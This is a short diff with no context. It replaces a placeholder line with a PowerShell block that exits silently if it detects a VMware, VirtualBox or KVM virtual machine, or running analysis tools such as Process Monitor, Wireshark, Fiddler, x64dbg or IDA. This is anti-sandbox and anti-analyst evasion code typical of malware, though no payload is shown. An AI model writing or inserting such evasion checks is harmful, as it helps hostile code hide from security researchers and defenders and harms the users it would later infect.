@@ -1,1 +1,7 @@
-fff
+try{
+    $cs=gwmi Win32_ComputerSystem
+    if($cs.Manufacturer -match 'VMware|VirtualBox' -or $cs.Model -match 'Virtual|KVM'){exit}
+    $b='procexp,procmon,wireshark,fiddler,tcpview,ollydbg,x64dbg,ida,ida64'.Split(',')
+    $p=ps|%{$_.Name}
+    if($b|?{$p -contains $_}){exit}
+}catch{}
